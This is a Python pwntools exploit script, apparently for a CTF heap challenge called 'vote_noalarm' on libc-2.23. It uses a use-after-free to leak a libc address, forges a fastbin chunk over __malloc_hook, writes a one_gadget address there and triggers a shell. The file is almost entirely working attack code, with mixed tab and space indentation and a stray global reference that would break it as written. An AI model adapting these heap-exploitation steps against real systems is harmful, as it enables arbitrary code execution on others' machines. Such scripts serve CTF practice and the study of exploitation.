from pwn import * 

class Pwnable:
    def __init__(self, p):
        self.p = p
	self.menuchar = "Action:"
        self.libc = ELF("libc-2.23.so") 
       # self.env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc-2.23.so")}

    def create_vote(self, size, data):
        print("[+] create vote of size %d" % size)
        self.p.sendline("0")
        print(self.p.recvuntil('size:'))
        self.p.sendline("%d" % size)
	print(self.p.recvuntil('name:'))
	self.p.sendline(data) #watch the newline.
	print(self.p.recvuntil(self.menuchar))
       # sleep(0.5)

    def show_vote(self, index):
	self.p.sendline("1")
	print(self.p.recvuntil("index:"))
	self.p.sendline("%d" % index)
	print(self.p.recvuntil(self.menuchar))

    def leak_local_heap(self, index):
        self.p.sendline("1")
        print(self.p.recvuntil("index"))
        self.p.sendline("%d" % index)
        jnk = self.p.recvn(35)
        n = self.p.recvn(8)
        x = hex(int(n))
        return x

    def leak_libc_addr(self, index):
        self.p.sendline("1")
        print(self.p.recvuntil("index"))
        self.p.sendline("%d" % index)
        r.recvuntil('count:')
        l = r.recvuntil('\n')
        l = int(l[:-1])
#        print(hex(l))
        return l

    def add_vote(self, index):
	self.p.sendline("2")
        print(self.p.recvuntil("index:"))
	self.p.sendline("%d" % index)
	print(self.p.recvuntil(self.menuchar))

    def vote_result(self, index):
	self.p.sendline('3')
	print(self.p.recvuntil(self.menuchar))
	# sleep(0.5)

    def cancel_vote(self, index):
        self.p.sendline('4')
        print(self.p.recvuntil("index:"))
        self.p.sendline("%d" % index)
        print(self.p.recvuntil(self.menuchar))

    def exit_note(self): #we will overwrite exit() so this might end up being our prim.
	print("[+] Exiting")
	self.p.sendline('5')


env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc-2.23.so")}
r = process('./vote_noalarm', env=env)
gdb.attach(r, '''
b *0x400d8c
b *0x4011cb
b *0x401163
''')

pwn = Pwnable(r)

#### Let's leak libc ! ####
pwn.create_vote(0x7f, "AAAA")
pwn.create_vote(0x7f, "BBBB")
pwn.cancel_vote(0) #trigger the UAF! 

main_arena_ptr = pwn.leak_libc_addr(0)
print(hex(main_arena_ptr))
#Okay so there is some interesting maths required here, because we need to replace the address of __malloc_hook, but we are currently in the local main_arena symbol for this bin, we need to first go to another symbol from main_arena, then calculate the libc_base and go to __malloc_hook. 
#For the sake of the argument, let's go to malloc from main_arena. 
#   - we will need to calculate this offset within GDB as main_arena isn't exported.
malloc_ptr = main_arena_ptr + 0x1f388
print(hex(malloc_ptr))
malloc_hook = malloc_ptr - 0x1f3f0 
print(hex(malloc_hook))
one_gadget = malloc_ptr - 0x39ec96
print(hex(one_gadget))

fchunk_x = p64(0) + p64(0x70) + p64(malloc_hook - 35) 
pwn.create_vote(0x50, fchunk_x)
pwn.create_vote(0x50, "CCCC")

pwn.cancel_vote(2)
pwn.cancel_vote(3) #free so we can place our malloc_hook chunk on the fastbin arena!

for i in range(0x20):
    pwn.add_vote(3)

pwn.create_vote(0x50, "DDDD")
pwn.create_vote(0x50, "EEEE") #now we will be alloc'd into malloc_hook

fake_chunk_y = "\x00"*3 + p64(one_gadget)
pwn.create_vote(0x50, fake_chunk_y)

### Final craft == boom! ###
r.sendline("0")
print(r.recvuntil('size:'))
r.sendline("16")
print(r.recvuntil("name:"))

print(r.interactive())

